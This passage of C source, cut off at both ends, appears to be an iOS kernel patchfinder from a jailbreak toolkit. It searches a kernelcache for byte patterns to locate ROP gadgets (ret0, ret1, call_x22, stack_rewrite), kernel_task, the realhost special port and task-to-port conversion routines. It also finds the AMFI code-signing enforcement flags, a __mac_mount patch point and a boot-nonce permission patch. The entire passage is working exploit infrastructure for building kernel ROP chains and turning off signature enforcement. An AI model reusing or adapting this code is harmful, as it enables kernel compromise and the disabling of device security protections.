    if (!vm_allocate_got)
        return 0;
    
    // read vm_allocate address
    uint64_t vm_allocate_address = *(uint64_t *)(kdata + vm_allocate_got) - region;
    //PFLog("vm_allocate address %p\n", (void *)vm_allocate_address);
    return vm_allocate_address;
}

uint64_t find_ptd_alloc(uint64_t region, uint8_t* kdata, size_t ksize)
{
    const char magicString[] = "\"out of ptd entry\\n\"";
    uint8_t* string = memmem(kdata, ksize, magicString, sizeof(magicString) - 1);
    if (!string)
        return 0;
    
    //PFLog("string offset %p\n", (void *)(string - kdata));
    
    uint32_t* ref = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)string - (uintptr_t)kdata);
    if (!ref)
        return 0;
    
    //PFLog("ref offset %p\n", (void *)((uint8_t*)ref - kdata));
    
    uint32_t *_ptd_alloc_offset = find_last_insn_matching_64(region, kdata, ksize, ref, insn_is_funcbegin_64);
    if (!_ptd_alloc_offset)
        return 0;
    
    //PFLog("_ptd_alloc offset %p\n", (void *)((uint8_t*)_ptd_alloc_offset - kdata));
    
    // locate sequence
    // ADRP            X9, #_gPhysBase@PAGE
    // LDR             X9, [X9,#_gPhysBase@PAGEOFF]
    // SUB             X8, X8, X9
    // ADRP            X9, #_gVirtBase@PAGE
    // LDR             X9, [X9,#_gVirtBase@PAGEOFF]
    // ADD             X23, X8, X9
    // MRS             X8, TPIDR_EL1
    
    uint32_t* mrs_instr = find_next_insn_matching_64(region, kdata, ksize, _ptd_alloc_offset, insn_is_mrs_from_TPIDR_EL1);
    if (!mrs_instr)
        return 0;
    
    // we need second occurance
    mrs_instr = find_next_insn_matching_64(region, kdata, ksize, mrs_instr + 1, insn_is_mrs_from_TPIDR_EL1);
    if (!mrs_instr)
        return 0;
    
    //PFLog("mrs Xy, TPIDR_EL1 %p\n", mrs_instr);
    
    return (uintptr_t)mrs_instr - (uintptr_t)kdata;
}

uint64_t find_gPhysAddr(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t _ptd_alloc_offset = find_ptd_alloc(region, kdata, ksize);
    if (!_ptd_alloc_offset)
        return 0;
    
    uint32_t* _ptd_alloc_ptr = (uint32_t *)(kdata + _ptd_alloc_offset);
    
    // get ADRP _gPhysBase
    uint32_t* adrp = _ptd_alloc_ptr - 6;
    
    if (!insn_is_adrp_64(adrp))
        return 0;
    
    //PFLog("adrp offset %p\n", (void *)((uint8_t *)_ptd_alloc_ptr - kdata));
    
    uint32_t* ldr = adrp + 1;
    if (!insn_is_ldr_imm_64(ldr)) {
        return 0;
    }
    
    //PFLog("ldr offset %p\n", (void *)((uint8_t *)ldr - kdata));
    
    return find_pc_rel_value_64(region, kdata, ksize, ldr + 1, insn_ldr_imm_rn_64(ldr));
}

uint64_t find_gVirtAddr(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t _ptd_alloc_offset = find_ptd_alloc(region, kdata, ksize);
    if (!_ptd_alloc_offset)
        return 0;
    
    uint32_t* _ptd_alloc_ptr = (uint32_t *)(kdata + _ptd_alloc_offset);
    
    // get ADRP _gVirtBase
    uint32_t* adrp = _ptd_alloc_ptr - 3;
    
    if (!insn_is_adrp_64(adrp))
        return 0;
    
    //PFLog("adrp offset %p\n", (void *)((uint8_t *)_ptd_alloc_ptr - kdata));
    
    uint32_t* ldr = adrp + 1;
    if (!insn_is_ldr_imm_64(ldr)) {
        return 0;
    }
    
    //PFLog("ldr offset %p\n", (void *)((uint8_t *)ldr - kdata));
    
    return find_pc_rel_value_64(region, kdata, ksize, ldr + 1, insn_ldr_imm_rn_64(ldr));
}

uint64_t find_gPhysAddr_pangu(uint64_t region, uint8_t* kdata, size_t ksize)
{
    const char magicString[] = "\"pmap_map_high_window_bd: insufficient pages";
    uint8_t* string = memmem(kdata, ksize, magicString, sizeof(magicString) - 1);
    if (!string)
        return 0;
    
    //PFLog("string offset %p\n", (void *)(string - kdata));
    
    uint32_t* ref = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)string - (uintptr_t)kdata);
    if (!ref)
        return 0;
    
    //PFLog("ref offset %p\n", (void *)((uint8_t*)ref - kdata));
    
    // locate second ADRP
    uint32_t* adrp = ref;
    int cnt = 0;
    while (cnt != 2) {
        adrp = find_next_insn_matching_64(region, kdata, ksize, adrp, insn_is_adrp_64);
        if (!adrp)
            return 0;
        
        cnt++;
    }
    
    //PFLog("adrp offset %p\n", (void *)((uint8_t *)adrp - kdata));
    
    uint32_t* ldr = adrp + 1;
    if (!insn_is_ldr_imm_64(ldr)) {
        // try to find next LDR
        return find_gPhysAddr(region, kdata, ksize);
    }
    
    //PFLog("ldr offset %p\n", (void *)((uint8_t *)ldr - kdata));
    
    return find_pc_rel_value_64(region, kdata, ksize, ldr + 1, insn_ldr_imm_rn_64(ldr));
}

// This points to kernel_pmap. Use that to change the page tables if necessary.
uint64_t find_pmap_location(uint64_t region, uint8_t *kdata, size_t ksize)
{
    // Find location of the pmap_map_bd string.
    uint8_t* pmap_map_bd = memmem(kdata, ksize, "\"pmap_map_bd\"", sizeof("\"pmap_map_bd\""));
    if (!pmap_map_bd)
        return 0;
    
    // Find a reference to the pmap_map_bd string. That function also references kernel_pmap
    uint32_t* ptr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)pmap_map_bd - (uintptr_t)kdata);
    if (!ptr)
        return 0;
    
    // Find the end of it.
    const uint8_t search_function_end[] = { 0xC0, 0x03, 0x5F, 0xD6 }; // RET
    // iOS 9.x dirty fix ^_^
    --ptr; --ptr;
    ptr = memmem(ptr, ksize - ((uintptr_t)ptr - (uintptr_t)kdata), search_function_end, sizeof(search_function_end));
    if (!ptr)
        return 0;
    
    // Find the last BL before the end of it. The third argument to it should be kernel_pmap
    uint32_t* bl = find_last_insn_matching_64(region, kdata, ksize, ptr, insn_is_bl_64);
    if (!bl)
        return 0;
    
    uint32_t *insn = 0;
    uint32_t *current_instruction = bl;
    while ( (uintptr_t)current_instruction > (uintptr_t)kdata ) {
        --current_instruction;
        if ( insn_is_ldr_imm_64(current_instruction) ) {
            if ( insn_ldr_imm_rt_64(current_instruction) == 2 ) {
                insn = current_instruction;
                break;
            }
        }
        if ( !insn_is_b_conditional_64(current_instruction) ) {
            if ( !insn_is_b_unconditional_64(current_instruction) )
                continue;
        }
        break;
    }
    if (!insn)
        return 0;
    uint64_t pc_rel = find_pc_rel_value_64(region, kdata, ksize, insn + 1, insn_ldr_imm_rn_64(insn));
    return pc_rel;
}

uint64_t find_PE_i_can_has_debugger(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find "STR W8, X0 // B PC+4 // STR WZR, [X0]"
    uint8_t magic[] = { 0x08, 0x00, 0x00, 0xB9, 0x02, 0x00, 0x00, 0x14, 0x1F, 0x00, 0x00, 0xB9 };
    uint32_t* insn = memmem(kdata, ksize, magic, sizeof(magic) / sizeof(*magic));
    if (!insn) {
        return 0;
    }
    
    uint8_t *func_begin = (uint8_t *)find_last_insn_matching_64(region, kdata, ksize, insn, insn_is_cbz_x64);
    if (!func_begin)
        return 0;
    
    return (uint64_t)(func_begin - kdata);
}

uint64_t find_debug_enabled(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t is_enabled_func = find_PE_i_can_has_debugger(region, kdata, ksize);
    if (!is_enabled_func)
        return 0;
    
    // convert to pointer
    uint32_t* insn = (uint32_t *)(kdata + is_enabled_func);
    
    // get adrp
    uint32_t* ldr = find_next_insn_matching_64(region, kdata, ksize, insn, insn_is_ldr_literal_64);
    if (!ldr)
        return 0;
    
    uintptr_t literal_address  = (uintptr_t)ldr + (uintptr_t)insn_ldr_literal_imm_64(ldr);
    uint64_t _debug_enabled = literal_address - (uintptr_t)kdata;
    return _debug_enabled;
}

uint64_t find_debug_boot_arg(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t is_enabled_func = find_PE_i_can_has_debugger(region, kdata, ksize);
    if (!is_enabled_func)
        return 0;
    
    // convert to pointer
    uint32_t* insn = (uint32_t *)(kdata + is_enabled_func);
    
    // get adrp
    uint32_t* adrp = find_next_insn_matching_64(region, kdata, ksize, insn, insn_is_adrp_64);
    if (!adrp)
        return 0;
    
    // locate function end
    uint32_t* ret = find_next_insn_matching_64(region, kdata, ksize, insn, insn_is_ret);
    if (!ret)
        return 0;

    uint64_t _debug_boot_arg = find_pc_rel_value_64(region, kdata, ksize, ret, insn_adrp_rd_64(adrp));
    return _debug_boot_arg;
}

uint64_t find_ret0_gadget(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t magic_x0_0_ret[] = { 0x00, 0x00, 0x80, 0xD2, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, magic_x0_0_ret, sizeof(magic_x0_0_ret) / sizeof(*magic_x0_0_ret));
    if (!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_ret1_gadget(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t magic_w0_1_ret[] = { 0xE0, 0x03, 0x00, 0x32, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, magic_w0_1_ret, sizeof(magic_w0_1_ret) / sizeof(*magic_w0_1_ret));
    if (!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_IOUserClient_getMetaClass(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t IOUserClient_dtor[] = {
        0x09, 0x7D, 0x5F, 0x88, 0x29, 0x61, 0x03, 0x51,
        0x09, 0x7D, 0x0A, 0x88, 0xAA, 0xFF, 0xFF, 0x35,
        0xFD, 0x7B, 0xC1, 0xA8, 0xC0, 0x03, 0x5F, 0xD6
    };
    uint8_t IOUserClient_dtor_ios8[] = {
        0x08, 0x00, 0x80, 0x92, 0x08, 0x00, 0x00, 0xF9,
        0x01, 0x1B, 0x80, 0xD2/*, 0x28, 0x0A, 0xFE, 0x17*/
    };
    size_t sequence_size = sizeof(IOUserClient_dtor) / sizeof(*IOUserClient_dtor);
    //bool isSecondMatch = true;
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, IOUserClient_dtor, sequence_size);
    if (!magicSequencePtr) {
        sequence_size = sizeof(IOUserClient_dtor_ios8) / sizeof(*IOUserClient_dtor_ios8);
        magicSequencePtr = memmem(kdata, ksize, IOUserClient_dtor_ios8, sequence_size);
        if (!magicSequencePtr)
            return 0;
        // include 'B OSObject::operator delete(void *,ulong)'
        sequence_size += 4;
        //isSecondMatch = false;
    }
    
    //PFLog("magicSequencePtr %#lx\n", magicSequencePtr - kdata);
    
    /*if (isSecondMatch) {
        ++magicSequencePtr;
        // we need second one, so locate sequence again
        size_t remain_size = ksize - (magicSequencePtr - kdata);
        magicSequencePtr = memmem(magicSequencePtr, remain_size, IOUserClient_dtor, sequence_size);
        if (!magicSequencePtr)
            return 0;
    }*/
    
    //PFLog("magicSequencePtr %#lx\n", magicSequencePtr - kdata);
    
    return (uint64_t)(magicSequencePtr + sequence_size - kdata);
}

uint64_t find_PE_i_can_has_kernel_configuration_got(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // string from LightweightVolumeManager::_mapForIO
    const char magicStr[] = "_mapForIO";
 
    void *_mapForIO_Str = memmem(kdata, ksize, magicStr, sizeof(magicStr) / sizeof(*magicStr));
    if (!_mapForIO_Str)
        return 0;
    
    // Find a reference to the _mapForIO string.
    uint32_t* ptr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)_mapForIO_Str - (uintptr_t)kdata);
    if (!ptr)
        return 0;
    
    // find begin of _mapForIO
    uint32_t *_mapForIOfunc = find_last_insn_matching_64(region, kdata, ksize, ptr, insn_is_funcbegin_64);
    if (!_mapForIOfunc)
        return 0;
    
    //PFLog("_mapForIO %#lx\n", (uint8_t *)_mapForIOfunc - kdata);
    
    uint32_t *insn = _mapForIOfunc;
    while (1) {
        insn = find_next_insn_matching_64(region, kdata, ksize, insn, insn_is_bl_64);
        if (!insn)
            return 0;
        
        if (insn_is_tbz(insn + 1))
            break;
    }
    
    //PFLog("bl PE_i_can_has_kernel_configuration %#lx\n", (uint8_t *)insn - kdata);
    
    return find_GOT_address_with_bl_64(region, kdata, ksize, insn);
}

// patch with B $PC+8
uint64_t find_lwvm_patch(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t magicCode[] = { 0x88, 0xD2, 0x40, 0xF9, 0x08, 0xA1, 0x40, 0x39 };
    uint8_t *ptr = memmem(kdata, ksize, magicCode, sizeof(magicCode) / sizeof(*magicCode));
    if (!ptr)
        return 0;
    
    return (uint64_t)(ptr - kdata + 8);
}

// return amfi_allow_any_signature address (allowInvalidSignatures)
// use +1 for amfi_get_out_of_my_way (allowEverything)
// use +2 for cs_enforcement_disable (csEnforcementDisable)
// use +3 for library validation (lvEnforceThirdParty)
uint64_t find_amfi_allow_any_signature(uint64_t region, uint8_t* kdata, size_t ksize)
{
    const char allowSignature[] = "%s: signature enforcement disabled by boot-arg\n";
    
    uint8_t *allowSignature_offset = memmem(kdata, ksize, allowSignature, sizeof(allowSignature) / sizeof(*allowSignature));
    if (!allowSignature_offset)
        return 0;
    
    //PFLog("allowSignature_offset %#lx\n", allowSignature_offset - kdata);
    
    // Find a reference to the string.
    uint32_t* insn = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)allowSignature_offset - (uintptr_t)kdata);
    if (!insn)
        return 0;
    
    uint32_t *strb_amfi_allow_any = find_next_insn_matching_64(region, kdata, ksize, insn, insn_is_strb);
    if (!strb_amfi_allow_any)
        return 0;
    
    // ADRP X22, #amfi_allow_any_signature@PAGE
    // ...
    // STRB W8, [X22,#amfi_allow_any_signature@PAGEOFF]
    // 1. find base
    uint64_t base_address = find_pc_rel_value_64(region, kdata, ksize, strb_amfi_allow_any, insn_rn_strb(strb_amfi_allow_any));
    // 2. extract offset from STRB
    return base_address + insn_strb_imm12(strb_amfi_allow_any);
}

// __mac_mount patch address
uint64_t find_mac_mount_patch(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // iOS 9.3.2, 9.3.3, 9.3.5
    uint8_t __mac_mount_9x[] =  { 0x48, 0x04, 0x30, 0x36, 0x14, 0x04, 0x00, 0x37 };
    uint8_t __mac_mount_10x[] = { 0x68, 0x05, 0x30, 0x36, 0x34, 0x05, 0x00, 0x37 };
    uint8_t __mac_mount_8x[] = {
        0x9F, 0x02, 0x1B, 0x72, 0x88, 0x7A, 0x0F, 0x12,
        0x89, 0x02, 0x10, 0x32, 0x34, 0x01, 0x88, 0x1A
    };
    
    uint8_t *insn = memmem(kdata, ksize, __mac_mount_9x, sizeof(__mac_mount_9x) / sizeof(*__mac_mount_9x));
    if (!insn) {
        // try iOS 10x case
        uint8_t *insn = memmem(kdata, ksize, __mac_mount_10x, sizeof(__mac_mount_10x) / sizeof(*__mac_mount_10x));
        if (!insn) {
            // try iOS 8x case
            size_t size = sizeof(__mac_mount_8x) / sizeof(*__mac_mount_8x);
            uint8_t *insn = memmem(kdata, ksize, __mac_mount_8x, size);
            if (!insn)
                return 0;
            return (insn + size - kdata);
        }
    }
    
    return (insn + 4 - kdata);
}

// nonceEnabler (patch (offset + 8 + 4) with kOFVariablePermUserRead = 1)
uint64_t find_nonce_variable(uint64_t region, uint8_t* kdata, size_t ksize)
{
	// iOS 9.x checked
	char nonceVarName[] = "com.apple.System.boot-nonce";
	uint8_t* nonceVarPtr = memmem(kdata, ksize, nonceVarName, sizeof(nonceVarName) / sizeof(*nonceVarName));
	if (!nonceVarPtr)
		return 0;
	uint64_t strAddr = (uint64_t)(nonceVarPtr - kdata) + region;
	uint8_t* nonceVar = memmem(kdata, ksize, &strAddr, 8);
	if (!nonceVar)
		return 0;
	
	return (uint64_t)(nonceVar - kdata);
}

uint64_t find_fill_x22(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t fill_x22[] = { 0xFD, 0x7B, 0x43, 0xA9, 0xF4, 0x4F, 0x42, 0xA9, 0xF6, 0x57, 0x41, 0xA9, 0xF8, 0x5F, 0xC4, 0xA8, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, fill_x22, sizeof(fill_x22) / sizeof(*fill_x22));
    if (!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_task_reference(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t _current_task = find_current_task(region, kdata, ksize);
    if (!_current_task)
        return 0;
    
    // next function is _task_reference
    return _current_task + 0xc;
}

uint64_t find_load_x0_from_x19(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t magic[] = { 0x60, 0x02, 0x40, 0xF9, 0xFD, 0x7B, 0x41, 0xA9, 0xF4, 0x4F, 0xC2, 0xA8, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, magic, sizeof(magic) / sizeof(*magic));
    if( !magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_store_x0_at_x19(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t _store_x0_x19[] = { 0x60, 0x02, 0x00, 0xF9, 0xFD, 0x7B, 0x41, 0xA9, 0xF4, 0x4F, 0xC2, 0xA8, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, _store_x0_x19, sizeof(_store_x0_x19) / sizeof(*_store_x0_x19));
    if (!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_current_task(uint64_t region, uint8_t* kdata, size_t ksize)
{
    //uint8_t mask_current_task_310[] ={0x88, 0xD0, 0x38, 0xD5, 0x00, 0x89, 0x41, 0xF9, 0xC0, 0x03, 0x5F, 0xD6 };
    //uint8_t mask_current_task_6B0[] ={0x88, 0xD0, 0x38, 0xD5, 0x00, 0x59, 0x43, 0xF9, 0xC0, 0x03, 0x5F, 0xD6 };
    uint8_t _current_task_magic[] =   { 0x88, 0xD0, 0x38, 0xD5, 0x00, 0x00, 0x00, 0xF9, 0xC0, 0x03, 0x5F, 0xD6 };
    uint8_t _current_task_mask[] =    { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    
    uint8_t* magicSequencePtr = find_masked(kdata, ksize, _current_task_magic, _current_task_mask, sizeof(_current_task_magic)/sizeof(*_current_task_magic));
    if (!magicSequencePtr)
        return 0;
    /*
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, mask_current_task_310, sizeof(mask_current_task_310) / sizeof(*mask_current_task_310));
    if (!magicSequencePtr) {
        magicSequencePtr = memmem(kdata, ksize, mask_current_task_6B0, sizeof(mask_current_task_6B0) / sizeof(*mask_current_task_6B0));
        if (!magicSequencePtr)
            return 0;
    }*/
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_get_task_ipcspace(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find _get_task_pmap
    uint8_t _get_task_pmap[] = { 0x08, 0x14, 0x40, 0xF9, 0x00, 0x2D, 0x40, 0xF9, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // old mask (iOS 9.x only)
    uint8_t _get_task_ipcspace[] = { 0x00, 0x50, 0x41, 0xF9, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, _get_task_pmap, sizeof(_get_task_pmap) / sizeof(*_get_task_pmap));
    if (!magicSequencePtr) {
        //PFLog("magic sequence is not found\n");
        return 0;
    } else {
        // previous function is _get_task_ipcspace
        magicSequencePtr -= 8;
    }
    
    //PFLog("magic sequence ptr = %p\n", (void *)(magicSequencePtr - kdata));
    
    if (!insn_is_ldr_imm_64((uint32_t *)magicSequencePtr)) {
        magicSequencePtr = memmem(kdata, ksize, _get_task_ipcspace, sizeof(_get_task_ipcspace) / sizeof(*_get_task_ipcspace));
        if (!magicSequencePtr)
            return 0;
        if (!insn_is_ldr_imm_64((uint32_t *)magicSequencePtr))
            return 0;
    }
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_just_ret(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // 'LDP X29, X30, [SP],#0x10 // RET'
    uint8_t load_frame_lr_ret[] = { 0xFD, 0x7B, 0xC1, 0xA8, 0xC0, 0x03, 0x5F, 0xD6 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, load_frame_lr_ret, sizeof(load_frame_lr_ret) / sizeof(*load_frame_lr_ret));
    if(!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_mov_x1_x0(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t mov_x1_x0_ret[] = { 0xE1, 0x03, 0x00, 0xAA, 0xE0, 0x03, 0x15, 0xAA, 0xC0, 0x02, 0x3F, 0xD6, 0x02, 0x00, 0x00, 0x14 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, mov_x1_x0_ret, sizeof(mov_x1_x0_ret) / sizeof(*mov_x1_x0_ret));
    if(!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_call_x22(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t mov_x1_x0 = find_mov_x1_x0(region, kdata, ksize);
    if (!mov_x1_x0)
        return 0;
    
    size_t offsetValue = 4 * 2;
    return mov_x1_x0 + offsetValue;
}

uint64_t find_thread_exception_return(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // find 'B _thread_exception_return // _thread_exception_return: MRS X0, TPIDR_EL1'
    uint8_t _thread_exception_return[] = { 0x01, 0x00, 0x00, 0x14, 0x80, 0xD0, 0x38, 0xD5 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, _thread_exception_return, sizeof(_thread_exception_return) / sizeof(*_thread_exception_return));
    if(!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr + 4 - kdata);
}

uint64_t find_stack_rewrite(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t _stack_rewrite[] = { 0x3D, 0x78, 0x4F, 0xA9, 0x22, 0x80, 0x40, 0xF9, 0x5F, 0x00, 0x00, 0x91 };
    
    // locate sequence
    uint8_t* magicSequencePtr = memmem(kdata, ksize, _stack_rewrite, sizeof(_stack_rewrite) / sizeof(*_stack_rewrite));
    if(!magicSequencePtr)
        return 0;
    
    return (uint64_t)(magicSequencePtr - kdata);
}

uint64_t find_kernel_task_old(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint64_t gPhysBase = find_gPhysAddr(region, kdata, ksize);
    if (!gPhysBase)
        return 0;
    
    //PFLog("gPhysBase = %p\n", (void *)gPhysBase);
    
    return gPhysBase - 0x30;
}

uint64_t find_kernel_task(uint64_t region, uint8_t* kdata, size_t ksize)
{
    char magicStr[] = "current_task() == kernel_task";
    uint8_t* stringPtr = memmem(kdata, ksize, magicStr, sizeof(magicStr) - 1);
    if (!stringPtr)
        return 0;
    
    //PFLog("current_task str offset %p\n", (void *)(stringPtr - kdata));
    
    // Find a reference to the string.
    uint32_t* insn = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)stringPtr - (uintptr_t)kdata);
    if (!insn)
        return 0;
    
    //PFLog("_tcp_cubic_congestion_avd panic offset %p\n", (void *)((uint8_t *)insn - kdata));
    
    uint32_t* _tcp_cubic_congestion_avd = find_last_insn_matching_64(region, kdata, ksize, insn, insn_is_funcbegin_64);
    if (!_tcp_cubic_congestion_avd)
        return 0;
    
    //PFLog("_tcp_cubic_congestion_avd offset %p\n", (void *)((uint8_t *)_tcp_cubic_congestion_avd - kdata));
    
    uint32_t* mrs_instr = find_next_insn_matching_64(region, kdata, ksize, _tcp_cubic_congestion_avd, insn_is_mrs_from_TPIDR_EL1);
    if (!mrs_instr)
        return 0;
    
    //PFLog("MRS Xy, TPIDR_EL1 offset %p\n", (void *)((uint8_t *)mrs_instr - kdata));
    
    uint32_t* adrp_instr = find_next_insn_matching_64(region, kdata, ksize, mrs_instr, insn_is_adrp_64);
    if (!adrp_instr)
        return 0;
    
    //PFLog("ADRP _kernel_task offset %p\n", (void *)((uint8_t *)adrp_instr - kdata));
    
    uint32_t* ldr = adrp_instr + 1;
    if (!insn_is_ldr_imm_64(ldr)) {
        return 0;
    }
    
    //PFLog("ldr offset %p\n", (void *)((uint8_t *)ldr - kdata));
    
    return find_pc_rel_value_64(region, kdata, ksize, ldr + 1, insn_ldr_imm_rn_64(ldr));
}

uint64_t find_convert_task_to_port(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t mask_special[] = { 0xD9, 0xF2, 0x7D, 0xD3 };
    // 1. find 'UBFM X25, X22, #0x3D, #0x3C' (_processor_set_tasks)
    // 2. find next BL instruction
    // 3. decode BL address - it's _convert_task_to_port
    // 4. add offsetValue
    uint8_t mask_special_812[] = { 0xB7, 0xF2, 0x7D, 0xD3 };
    // switchboard 9.0
    uint8_t mask_special_90[] = { 0xB6, 0xF2, 0x7D, 0xD3 };
    // 1. find 'UBFM X23, X21, #0x3D, #0x3C'
    
    // locate sequence
    uint32_t* magicSequencePtr = (uint32_t *)memmem(kdata, ksize, mask_special, sizeof(mask_special) / sizeof(*mask_special));
    if (!magicSequencePtr) {
        magicSequencePtr = (uint32_t *)memmem(kdata, ksize, mask_special_812, sizeof(mask_special_812) / sizeof(*mask_special_812));
        if (!magicSequencePtr) {
            magicSequencePtr = (uint32_t *)memmem(kdata, ksize, mask_special_90, sizeof(mask_special_90) / sizeof(*mask_special_90));
            if (!magicSequencePtr)
                return 0;
        }
    }
    //PFLog("magicSequencePtr offset %p\n", (void *)((uint8_t *)magicSequencePtr - kdata));
    
    uint32_t *bl_convert_task_to_port = find_next_insn_matching_64(region, kdata, ksize, magicSequencePtr, insn_is_bl_64);
    if (!bl_convert_task_to_port)
        return 0;
    //PFLog("bl_convert_task_to_port offset %p\n", (void *)((uint8_t*)bl_convert_task_to_port - kdata));
    
    uint8_t* address = (uint8_t *)bl_convert_task_to_port + insn_bl_imm32_64(bl_convert_task_to_port);
    if (!address)
        return 0;
    //PFLog("address offset %p\n", (void *)(address - kdata));
    
    return (uint64_t)(address - kdata);
}

uint64_t find_realhost_special(uint64_t region, uint8_t* kdata, size_t ksize)
{
    // 1. find with memmem
    // 2. find string reference
    // 3. find first BL before reference
    // 4. parse GOT, it's _host_get_special_port
    // 5. find first ADRP inside it
    // 6. Extract address and add offsetValue
    
    // iOS 9.0 sw
    const char magicStringSW[] = "Failed to get the container_managerd port.\n";
    const char magicString[] = "Failed to get the HOST_CONTAINERD_PORT port: %d";
    // iOS 8.1.2, 8.3, 8.4
    const char magicString2[]= "Sandbox failed to revoke host port (%d) for pid %d";
    uint8_t* string = memmem(kdata, ksize, magicStringSW, sizeof(magicStringSW) - 1);
    if (!string) {
        string = memmem(kdata, ksize, magicString, sizeof(magicString) - 1);
        if (!string) {
            string = memmem(kdata, ksize, magicString2, sizeof(magicString2) - 1);
            if (!string)
                return 0;
        }
    }
    //PFLog("magicString offset %p\n", (void *)(string - kdata));
    
    uint32_t* ref = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, (uintptr_t)string - (uintptr_t)kdata);
    if(!ref)
        return 0;
    //PFLog("ref offset %p\n", (void *)((uint8_t *)ref - kdata));
    
    uint32_t *bl_GOT_host_get_special_port = find_last_insn_matching_64(region, kdata, ksize, ref, insn_is_bl_64);
    if (!bl_GOT_host_get_special_port)
        return 0;
    //PFLog("bl_GOT_host_get_special_port offset %p\n", (void *)((uint8_t *)bl_GOT_host_get_special_port - kdata));
    
    uint64_t _host_get_special_port = find_GOT_address_with_bl_64(region, kdata, ksize, bl_GOT_host_get_special_port);
    if (!_host_get_special_port)
        return 0;
    //PFLog("_host_get_special_port offset %p\n", (void *)_host_get_special_port);
    
    uint64_t _host_get_special_port_addr = *(uint64_t *)(kdata + _host_get_special_port);
    //PFLog("_host_get_special_port_addr %p\n", (void *)(_host_get_special_port_addr - region));
    
    void *insn = kdata + (_host_get_special_port_addr - region);
    
    uint32_t *insn_adrp = find_next_insn_matching_64(region, kdata, ksize, insn, insn_is_adrp_64);
    if (!insn_adrp)
        return 0;
    //PFLog("insn_adrp offset %p\n", (void *)((uint8_t *)insn_adrp - kdata));
    
    uint64_t table_value = find_pc_rel_value_64(region, kdata, ksize, insn_adrp + 2, insn_adrp_rd_64(insn_adrp));
    if (!table_value)
        return 0;
    //PFLog("table_value offset %p\n", (void *)table_value);
    
    return table_value;
}

uint64_t find_ipc_port_copyout_send(uint64_t region, uint8_t* kdata, size_t ksize)
{
    //uint8_t mask_special[] = { 0x88, 0xD0, 0x38, 0xD5, 0x08, 0x89, 0x41, 0xF9, 0x01, 0x51, 0x41, 0xF9, 0xE0, 0x03, 0x17, 0xAA };
    
    uint8_t magic_code[] = { 0x88, 0xD0, 0x38, 0xD5, 0x08, 0x00, 0x00, 0xF9, 0x01, 0x00, 0x41, 0xF9, 0xE0, 0x03, 0x17, 0xAA };
    uint8_t magic_mask[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
